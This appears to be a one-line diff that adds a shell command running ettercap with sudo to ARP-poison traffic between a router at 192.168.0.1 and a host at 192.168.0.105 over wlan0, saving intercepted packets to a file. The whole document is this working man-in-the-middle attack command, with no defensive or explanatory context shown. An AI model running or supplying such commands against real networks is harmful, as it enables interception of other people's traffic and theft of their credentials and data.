@@ -1,0 +1,1 @@
+timeout 20 sudo ettercap -T -S -i "wlan0" -w mitm -M arp:remote /192.168.0.1// /192.168.0.105//
